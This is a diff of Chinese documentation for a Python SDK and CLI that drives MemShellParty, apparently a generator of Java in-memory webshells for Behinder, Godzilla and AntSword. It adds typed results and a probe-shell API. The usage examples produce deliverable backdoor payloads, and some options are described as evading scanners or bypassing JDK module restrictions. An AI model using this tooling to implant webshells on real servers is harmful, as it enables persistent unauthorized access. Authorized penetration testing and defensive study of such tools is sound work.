@@ -13,20 +13,18 @@
 ## 快速上手
 
 ```python
-from wtfutil.memshellutil import MemShellParty, MemShellPartyError
+from wtfutil.memshellutil import MemShellParty, MemShellPartyError, ShellTool, ShellType
 
 with MemShellParty() as client:
     result = client.generate(
-        shell_tool="behinder",   # 不区分大小写
-        shell_type="listener",
+        shell_tool=ShellTool.BEHINDER,
+        shell_type=ShellType.LISTENER,
         jre=9,                   # Java/JRE 发行版本；≥9 时自动 byPassJavaModule=True
         password="example-pass",         # 通用密码 → behinderPass
         header_value="example-token",    # 请求头门槛（默认 header_name=User-Agent）
     )
-    payload = result["packResult"]           # 打包后的可投递字符串
-    info = result["memShellResult"]          # 类名、尺寸、连接参数等
-    print(payload[:80], "...")
-    print(info["shellClassName"], info["injectorClassName"])
+    print(result.pack_result[:80], "...")
+    print(result.shell_class_name, result.injector_class_name)
 ```
 
 SDK 符号从公开子模块导入：
@@ -87,7 +85,10 @@ client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
 | `get_config()` | 查询「中间件 → 工具 → 挂载类型」合法组合 |
 | `get_packers_tree()` | 查询可用 packer 树（打包格式） |
 | `get_command_configs()` | Command 工具可用的加密器 / 执行实现 |
-| `generate(body=None, **kwargs)` | 生成内存马并打包，返回完整 JSON |
+| `generate(body=None, **kwargs)` | 生成内存马并打包，返回 `MemShellGenerateResult` |
+| `generate_probe(body=None, **kwargs)` | 生成探测马并打包，返回 `ProbeGenerateResult` |
+
+`generate(probe=True)` 只是内存马生成里的**回显探测开关**（把注入器放进回显马，便于非本地确认）。`generate_probe` 走独立接口 `POST /api/probe/generate`，生成的是探测马，不是同一种产物。
 
 ### 先查再生成（推荐）
 
@@ -115,7 +116,7 @@ with MemShellParty() as client:
 
 `body` 必须是 JSON 对象；其中的 `shellConfig`、`shellToolConfig` 和 `injectorConfig` 也必须是对象。嵌套类型错误会在发送生成请求前直接抛出 `TypeError`。`extract_generate_meta()` 也会对响应中的对应字段执行相同的对象类型校验。
 
-**大小写**：`server` / `shell_tool` / `shell_type` 在已知官方名称内**不区分大小写**（`tomcat` → `Tomcat`，`GODZILLA` → `Godzilla`）。未知名称原样上传。已知表可能滞后于上游，可用 `get_config()` / `memshell config` 核对。
+**大小写**：`server` / `shell_tool` / `shell_type` 可传 `Server` / `ShellTool` / `ShellType` 枚举，或在已知官方名称内**不区分大小写**的字符串（`tomcat` → `Tomcat`，`GODZILLA` → `Godzilla`）。未知名称原样上传。已知表可能滞后于上游，可用 `get_config()` / `memshell config` 核对。
 
 ### 内置默认（对齐官方常用 UI）
 
@@ -141,7 +142,7 @@ with MemShellParty() as client:
 | `password="example-pass"` | 按当前 `shell_tool` 映射到冰蝎 / 哥斯拉 / 蚁剑的 `*Pass` |
 | `key="example-key"` | 写入哥斯拉 `godzillaKey`（其它工具一般无意义） |
 | `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | 高级：专用字段优先于通用 `password` / `key`（日常用通用即可） |
-| 密码类留空 | 服务端随机生成，结果在 `memShellResult.shellToolConfig` 中回传 |
+| 密码类留空 | 服务端随机生成，结果在 `result.shell_tool_config` 中回传 |
 | `header_name` + `header_value` | 匹配该请求头后才进入马逻辑；`header_value` 常需自行设定 |
 
 ```python
@@ -182,7 +183,7 @@ client.generate(
 | `debug` | shellConfig.debug | 注入器打印注入信息，Shell 打印异常堆栈 |
 | `by_pass_java_module` | shellConfig.byPassJavaModule | 绕过 JDK9+ 模块限制（Unsafe defineClass） |
 | `shrink` | shellConfig.shrink | 缩小字节码（ASM SKIP_DEBUG）；默认 True |
-| `probe` | shellConfig.probe | 回显探测：把注入器放入回显马，便于非本地确认 |
+| `probe` | shellConfig.probe | 内存马回显探测开关（不是 `generate_probe`） |
 | `lambda_suffix` | shellConfig.lambdaSuffix | 类名追加 `$Proxy0$$Lambda$1`，利于绕过部分扫描 |
 | `url_pattern` | injectorConfig.urlPattern | 挂载/匹配 URL，默认 `/*` |
 | `injector_class_name` | injectorConfig.injectorClassName | 注入器全限定类名；空则随机 |
@@ -206,22 +207,22 @@ client.generate(
 
 ## 返回值怎么用
 
-`generate` 成功时返回 **dict**（完整服务端 JSON），常用字段：
+`generate` 成功时返回 **`MemShellGenerateResult`**，用属性取值，不要按 JSON 键下标：
 
-| 键 | 用途 |
-|----|------|
-| `packResult` | 按 `packer` 打包后的主产物（字符串）；业务侧通常只关心这个 |
-| `allPackResults` | 部分场景下的多格式产物（若有） |
-| `memShellResult` | 元信息：类名、大小、最终 shellConfig / shellToolConfig / injectorConfig |
+| 属性 | 用途 |
+|------|------|
+| `pack_result` | 按 `packer` 打包后的主产物（字符串）；业务侧通常只关心这个 |
+| `all_pack_results` | 部分场景下的多格式产物（若有） |
+| `shell_class_name` / `injector_class_name` | 类名 |
+| `shell_size` / `injector_size` | 尺寸 |
+| `shell_config` / `shell_tool_config` / `injector_config` | 最终配置（已去掉载荷类字段） |
 
 ```python
 result = client.generate(...)
-payload = result["packResult"]
-
-mem = result["memShellResult"]
-print(mem["shellClassName"], mem["injectorClassName"])
-print(mem["shellSize"], mem["injectorSize"])
-print(mem["shellToolConfig"])  # 密码留空时会包含服务端生成的连接凭证
+payload = result.pack_result
+print(result.shell_class_name, result.injector_class_name)
+print(result.shell_size, result.injector_size)
+print(result.shell_tool_config)  # 密码留空时会包含服务端生成的连接凭证
 ```
 
 若只要紧凑元信息、不要大段 `packResult`，可用：
@@ -231,6 +232,38 @@ from wtfutil.memshellutil import extract_generate_meta
 
 meta = extract_generate_meta(result)
 # shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
+```
+
+---
+
+## generate_probe：探测马
+
+`generate_probe` 调用 `POST /api/probe/generate`，返回 `ProbeGenerateResult`（`pack_result`、`shell_class_name`、`shell_size`、`probe_config` 等属性）。默认对齐官方探测页：`method=ResponseBody`、`content=Command`、`shrink=True`、`static_initialize=True`、`seconds=5`、`server=Tomcat`、`sleep_server=Tomcat`。`jre` 换算与 `generate` 相同（默认 6；class ≥53 时自动 `byPassJavaModule=True`）。成功响应若不是 JSON 对象，抛出固定文案的 `MemShellPartyError`。
+
+`method` / `content` / `server` / `sleep_server` 可传枚举（`ProbeMethod`、`ProbeContent`、`Server`）或字符串；已知名称内不区分大小写。SDK **不校验** method 与 content 的组合；非法组合由服务端报 `MemShellPartyError`。空的 `host` / `req_param_name` / `command_template` 不会写入 JSON。
+
+```python
+from wtfutil.memshellutil import MemShellParty, ProbeContent, ProbeMethod, extract_probe_meta
+
+with MemShellParty() as client:
+    result = client.generate_probe(
+        method=ProbeMethod.RESPONSE_BODY,
+        content=ProbeContent.COMMAND,
+        jre=9,
+    )
+    print(result.shell_class_name, result.shell_size)
+    payload = result.pack_result
+    meta = extract_probe_meta(result)
+```
+
+也可只组装请求体：
+
+```python
+from wtfutil.memshellutil import MemShellParty, build_probe_body
+
+req = build_probe_body(method="dnslog", content="server", host="x.example.test", jre=9)
+with MemShellParty() as client:
+    result = client.generate_probe(body=req)
 ```
 
 ---
@@ -252,7 +285,7 @@ with MemShellParty() as client:
         header_value="example-token",
         packer="DefaultBase64",
     )
-    open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
+    open("payload.txt", "w", encoding="utf-8").write(r.pack_result)
 ```
 
 ### Command 工具
@@ -309,7 +342,7 @@ result = client.generate(body=req)
 
 | 属性 | 含义 |
 |------|------|
-| `str(e)` / `args` | 固定错误类别与 HTTP 状态码；网络错误另含脱敏目标、异常类型和 errno 摘要 |
+| `str(e)` / `args` | 有服务端 `error` 字符串时带上原文（最长 500）和 HTTP 状态码；否则是固定类别。网络错误另含脱敏目标、异常类型和 errno 摘要 |
 | `e.status_code` | HTTP 状态码（可能为 `None`） |
 | `e.body` | 兼容属性；SDK 产生的错误保持为 `None`，不保存原始响应 |
 
@@ -323,7 +356,7 @@ except MemShellPartyError as e:
     print(e, e.status_code)
 ```
 
-常见原因：组合不合法、服务不可达、响应非 JSON、超时。HTTP 错误、非 JSON 响应和响应中的 `error` 字段只公开固定错误类别与状态码，不包含服务端原文或响应载荷。网络层 `requests` 异常统一包装为 `MemShellPartyError`；包装器会主动抑制原始异常上下文，避免 traceback 泄露凭证、请求体、代理详情或响应载荷。内部 session 默认仅重试连接阶段失败 2 次；不重试读取超时、HTTP 状态错误或响应解析错误。外部传入的 session 保留调用方自己的重试策略。内部重试策略同时兼容新旧 urllib3 的构造参数名称。
+常见原因：组合不合法、服务不可达、响应非 JSON、超时。响应里的 `error` 字符串会进入 `str(e)`（例如 `Unsupported server type: 'SpringWebFlux1'. (HTTP 400)`），方便改参数；`packResult`、请求体、凭证仍不会进异常。非 JSON 或没有 `error` 字段时仍只报固定类别与状态码。网络层 `requests` 异常统一包装为 `MemShellPartyError`；包装器会主动抑制原始异常上下文，避免 traceback 泄露凭证、请求体、代理详情或响应载荷。内部 session 默认仅重试连接阶段失败 2 次；不重试读取超时、HTTP 状态错误或响应解析错误。外部传入的 session 保留调用方自己的重试策略。内部重试策略同时兼容新旧 urllib3 的构造参数名称。
 
 ---
 
@@ -333,13 +366,18 @@ except MemShellPartyError as e:
 |------|------|
 | `DEFAULT_BASE_URL` | 默认服务根地址常量 |
 | `JRE_RELEASE_TO_CLASS` | JRE 发行版 → class 主版本映射（一般无需直接使用） |
+| `Server` / `ShellTool` / `ShellType` / `ProbeMethod` / `ProbeContent` | SDK 参数枚举（也接受同义字符串） |
 | `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | 大小写归一用的已知名称表 |
 | `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | 单独归一化 |
 | `memshell_config` | 运行时配置 dict（`BASE_URL`） |
-| `build_generate_body(...)` | 只组装请求体，不发 HTTP |
+| `build_generate_body(...)` | 只组装内存马请求体，不发 HTTP |
+| `build_probe_body(...)` | 只组装探测马请求体，不发 HTTP |
 | `resolve_jre_class_version(...)` | 将 `jre`/发行版或 class 主版本统一为 API 数字 |
 | `resolve_shell_credentials(...)` | 将 `password`/`key` 映射到专用凭证字段 |
-| `extract_generate_meta(result, output=...)` | 从响应提取紧凑 meta |
+| `extract_generate_meta(result, output=...)` | 从内存马响应提取紧凑 meta |
+| `MemShellGenerateResult` | `generate` 返回对象（`pack_result` / `shell_class_name` / …）；`to_dict()` 给出 camelCase 子集 |
+| `ProbeGenerateResult` | `generate_probe` 返回对象（`pack_result` / `shell_class_name` / …）；`to_dict()` 给出 camelCase 子集 |
+| `extract_probe_meta(result, output=...)` | 从探测马响应提取紧凑 meta；配置字段白名单 + 递归脱敏 |
 | `MemShellPartyError` | API / 协议错误 |
 
 ---
@@ -352,18 +390,23 @@ except MemShellPartyError as e:
 memshell generate --help
 memshell generate -o payload.txt
 memshell generate --shell-tool Godzilla --shell-type Filter --jre 9 -o out.txt
+memshell probe -o payload.txt
+memshell probe -m ResponseBody -c Command -p DefaultBase64 -o payload.txt
 memshell config
 memshell packers
 memshell install-skill --project
 ```
 
+`memshell probe` 生成探测马（`POST /api/probe/generate`）。`generate --probe` 仍是内存马回显探测开关，不是同一条子命令。
+
 - **`-o PATH`**：文件只写 `packResult`；stdout 为 meta JSON。
-- **无 `-o`**：stdout 完整响应 JSON。
+- **无 `-o`**：stdout 为 `to_dict()` 形态的 JSON（含 `packResult`，不含 class 字节等载荷字段）。
 - **`--jre`**：目标 Java 发行版本（6/8/9/11/17/21/22，后续版本也按标准映射）。
-- **`--server` / `--shell-tool` / `--shell-type`**：已知名称内不区分大小写。
+- **`--server` / `--shell-tool` / `--shell-type` / `--method` / `--content` / `--sleep-server`**：已知名称内不区分大小写。
+- **`--seconds`**：非法值输出单行 `error: ...`，退出码 1。
 - 日常用 `--password` / `--key` 即可；专用 `*-pass` 与 `--target-jre-version` 仍可用但不在 `--help` 中展示。
 
-参数与上表 kwargs 对应，详见 `memshell generate --help`。
+参数与上表 kwargs 对应，详见 `memshell generate --help` / `memshell probe --help`。
 
 ---
 
